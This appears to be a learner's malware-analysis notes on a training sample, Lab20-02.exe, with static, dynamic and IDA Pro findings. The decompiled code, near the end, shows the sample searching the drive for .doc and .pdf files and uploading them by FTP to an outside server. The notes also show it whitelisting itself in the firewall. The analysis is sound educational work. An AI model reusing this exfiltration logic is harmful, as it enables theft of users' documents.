Lab20-02.exe
    PE Analysis
        # Virustotal
            32/68
            SHA-256: 49d5cc85b8f66cdb238ed1d4bb46709b975f1627acfc934385271ed3be6f77d1

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-11-17 17:58:53

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	16612	20480	5.78	ed2c921bd944535663e8bb90923b2b23
                .rdata	24576	2406	4096	3.63	721182487cafbfcf3f8db76fc7587824
                .data	28672	8056	4096	1.44	f2532b43e5971bf71ba1cf46ddbf4815

        Imports
            KERNEL32.dll
                GetLastError
                HeapFree
                GetStdHandle
                LCMapStringW
                SetHandleCount
                GetOEMCP
                LCMapStringA
                HeapDestroy
                HeapAlloc
                GetEnvironmentStringsW
                FlushFileBuffers
                LoadLibraryA
                RtlUnwind
                GetModuleFileNameA
                FreeEnvironmentStringsA
                GetStartupInfoA
                GetEnvironmentStrings
                GetCPInfo
                UnhandledExceptionFilter
                MultiByteToWideChar
                FreeEnvironmentStringsW
                GetCommandLineA
                GetProcAddress
                SetStdHandle
                SetFilePointer
                WideCharToMultiByte
                GetStringTypeA
                GetModuleHandleA
                FindFirstFileA              // Find something
                WriteFile
                GetCurrentProcess
                CloseHandle
                FindNextFileA               // Find something
                GetACP
                HeapReAlloc
                GetStringTypeW
                TerminateProcess
                HeapCreate
                VirtualFree
                FindClose
                GetFileType
                ExitProcess
                GetVersion
                VirtualAlloc
            WININET.dll
                InternetConnectA
                FtpSetCurrentDirectoryA
                InternetCloseHandle
                InternetOpenA
                FtpPutFileA
            WS2_32.dll
                WSAStartup
                gethostname

        # strings.exe
            .pdf
            .doc
            %s-%d.pdf
            pdfs
            ftp.practicalmalwarenalaysis.com                // !
            Home ftp client
            %s-%d.doc
            docs
            C:\\*
    
    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Values added:2
            ----------------------------------
            HKLM\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\C:\Documents and Settings\practice\Desktop\Lab20-02.exe: "C:\Documents and Settings\practice\Desktop\Lab20-02.exe:*:Enabled:Lab20-02"
            HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\C:\Documents and Settings\practice\Desktop\Lab20-02.exe: "C:\Documents and Settings\practice\Desktop\Lab20-02.exe:*:Enabled:Lab20-02"

            ----------------------------------
            Values modified:4
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 97 93 B4 39 6F B9 97 24 E1 25 30 5F 9E 44 9A D8 BA 02 FE 26 E9 C4 4F 76 CA D0 06 3F CB B7 B1 70 46 32 7B 54 A1 C2 2D F0 9D 9D E3 E9 E5 EC C7 C0 E6 66 24 0E E8 1A 20 91 C9 67 8B 28 53 73 5C FB CF CC 4B 21 12 86 02 B2 82 3F 24 D1 91 E9 3B 69
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 07 B9 1B BA 8D 1D FC F8 28 C8 09 47 1B 84 DC ED 5A 4A 23 0F 02 E4 C0 AD 6C 1F A7 6F F9 42 24 4C 37 E9 03 95 00 76 7B 0D E8 10 A1 B5 79 B3 80 7D D6 FE 4C 62 9F 56 55 92 FC 5D 86 90 F5 2A 32 B2 77 46 C9 F9 6E C8 C0 6C 04 61 F6 89 B5 46 88 E5
            HKLM\SYSTEM\ControlSet001\Services\SharedAccess\Epoch\Epoch: 0x0000001A
            HKLM\SYSTEM\ControlSet001\Services\SharedAccess\Epoch\Epoch: 0x0000001C
            HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Epoch\Epoch: 0x0000001A
            HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Epoch\Epoch: 0x0000001C
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings: 46 00 00 00 10 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 C0 54 DE 4C 9C 19 D6 01 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 0A 00 00 02 00 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 08 B8 16 00 60 35 18 00 00 00 00 00 10 01 00 00 FF FF FF FF 00 00 00 00 0C 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 A8 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 40 9D 05 22 9E 7E CF 11 AE 5A 00 AA 00 A7 11 2B 6D 00 61 00 6C 00 77 00 61 00 72 00 65 00 00 00 00 00 00 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings: 46 00 00 00 11 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 C0 54 DE 4C 9C 19 D6 01 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 0A 00 00 02 00 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 08 B8 16 00 60 35 18 00 00 00 00 00 10 01 00 00 FF FF FF FF 00 00 00 00 0C 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 A8 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 40 9D 05 22 9E 7E CF 11 AE 5A 00 AA 00 A7 11 2B 6D 00 61 00 6C 00 77 00 61 00 72 00 65 00 00 00 00 00 00 00


        # procexp
            NULL

        # procmon
            Filter
                Process Name is Lab20-02.exe Include

            Result
                9:17:21.9169064 PM	Lab20-02.exe	776	ReadFile	C:\$Directory	SUCCESS	Offset: 0, Length: 4,096, I/O Flags: Non-cached, Paging I/O, Synchronous Paging I/O
                9:17:21.9185482 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft	SUCCESS	0: .., 1: CryptnetUrlCache, 2: Media Player, 3: SystemCertificates
                9:17:21.9194883 PM	Lab20-02.exe	776	CreateFile	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache	SUCCESS	Desired Access: Read Data/List Directory, Synchronize, Disposition: Open, Options: Directory, Synchronous IO Non-Alert, Attributes: n/a, ShareMode: Read, Write, AllocationSize: n/a, OpenResult: Opened
                9:17:21.9217573 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\*	SUCCESS	Filter: *, 1: .
                9:17:21.9251762 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache	SUCCESS	0: .., 1: Content, 2: MetaData
                9:17:21.9253569 PM	Lab20-02.exe	776	CreateFile	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\Content	SUCCESS	Desired Access: Read Data/List Directory, Synchronize, Disposition: Open, Options: Directory, Synchronous IO Non-Alert, Attributes: n/a, ShareMode: Read, Write, AllocationSize: n/a, OpenResult: Opened
                9:17:21.9254703 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\Content\*	SUCCESS	Filter: *, 1: .
                9:17:21.9273809 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\Content	SUCCESS	0: .., 1: 2BF68F4714092295550497DD56F57004, 2: 94308059B57B3142E455B38A6EB92015
                9:17:21.9274670 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\Content	NO MORE FILES	
                9:17:21.9275843 PM	Lab20-02.exe	776	CreateFile	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\MetaData	SUCCESS	Desired Access: Read Data/List Directory, Synchronize, Disposition: Open, Options: Directory, Synchronous IO Non-Alert, Attributes: n/a, ShareMode: Read, Write, AllocationSize: n/a, OpenResult: Opened
                9:17:21.9287241 PM	Lab20-02.exe	776	QueryDirectory	C:\Documents and Settings\Default User\Application Data\Microsoft\CryptnetUrlCache\MetaData\*	SUCCESS	Filter: *, 1: .
            
        # autoruns
            NULL            

        # ApateDNS
            ftp.practicalmalwarenalaysis.com

        # INetSim
            2020-05-13 00:11:20  FTP connection, created: 1, deleted: 0, retrieved: 0, authentication data: anonymous:IEUser@

        # sc
            NULL

        # IDA Pro
            int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
            {
            v6 = WSAStartup(0x202u, &WSAData);
            gethostname(name, 256);
            sub_401000(FileName, 0);
            return 0;
            }

            sub_401000
                if ( !strncmp(v14, '.doc', 4u) )
                else if ( !strncmp(v14, '.pdf'', 4u) )

                v13 = operator new(8u);
                if ( v13 )
                {
                    *v13 = &off_4060E0;         // junk
                    *v13 = off_4060DC;          // overwrite the last code
                    v10 = v13;
                    ...
                v16 = v10

                v12 = operator new(8u);
                if ( v12 )
                {
                    *v12 = &off_4060E0;
                    *v12 = off_4060D8;
                    v9 = v12
                ...
                v16 = v9
                
                .rdata:004060D8 off_4060D8      dd offset sub_401380    ; DATA XREF: sub_401000+293↑o
                .rdata:004060DC off_4060DC      dd offset sub_401440    ; DATA XREF: sub_401000+204↑o

                BOOL __thiscall sub_401380(LPCSTR *this)
                {
                v1 = this;
                hInternet = InternetOpenA(szAgent, 1u, 0, 0, 0);
                hConnect = InternetConnectA(hInternet, szServerName, 0x15u, 0, 0, 1u, 0, 0);        // ftp.practicalmalwarenalaysis.com
                FtpSetCurrentDirectoryA(hConnect, szDirectory);         // pdfs
                sprintf(&szNewRemoteFile, aSDPdf, name, dword_407A30);
                FtpPutFileA(hConnect, v1[1], &szNewRemoteFile, 0, 0);
                InternetCloseHandle(hConnect);
                return InternetCloseHandle(hInternet);
                }

                BOOL __thiscall sub_401440(LPCSTR *this)
                {
                v1 = this;
                hInternet = InternetOpenA(szAgent, 1u, 0, 0, 0);
                hConnect = InternetConnectA(hInternet, szServerName, 0x15u, 0, 0, 1u, 0, 0);        // ftp.practicalmalwarenalaysis.com
                FtpSetCurrentDirectoryA(hConnect, aDocs);               // docs
                sprintf(&szNewRemoteFile, aSDDoc, name, dword_407A30);
                FtpPutFileA(hConnect, v1[1], &szNewRemoteFile, 0, 0);
                InternetCloseHandle(hConnect);
                return InternetCloseHandle(hInternet);
                }